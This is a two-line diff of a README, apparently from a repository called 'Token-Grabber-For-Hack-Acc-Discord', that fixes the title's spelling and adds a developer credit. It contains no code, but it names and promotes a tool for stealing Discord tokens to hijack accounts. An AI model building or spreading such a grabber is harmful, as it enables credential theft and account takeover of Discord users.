@@ -1,2 +1,2 @@
-# Token-Grabber-For-Hack-Acc-DIscord
-Token GrabbeR 
+# Token-Grabber-For-Hack-Acc-Discord
+Token GrabbeR Dev: NoTTeDDeaD
